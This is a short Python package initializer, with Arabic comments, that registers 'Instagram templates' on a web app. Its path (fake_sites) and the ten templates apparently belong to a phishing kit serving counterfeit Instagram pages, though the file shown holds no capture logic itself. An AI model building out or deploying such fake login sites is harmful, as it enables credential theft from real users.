# fake_sites/instagram/__init__.py
# ============================================================
# قسم Instagram — 10 قوالب
# ============================================================

from logging_config import get_logger

logger = get_logger("fake_sites.instagram")


def init_instagram_templates(app):
    """تسجيل مسارات Instagram"""
    from .routes import register_instagram_routes

    register_instagram_routes(app)
    logger.info("[+] Instagram templates registered")


__all__ = ['init_instagram_templates']
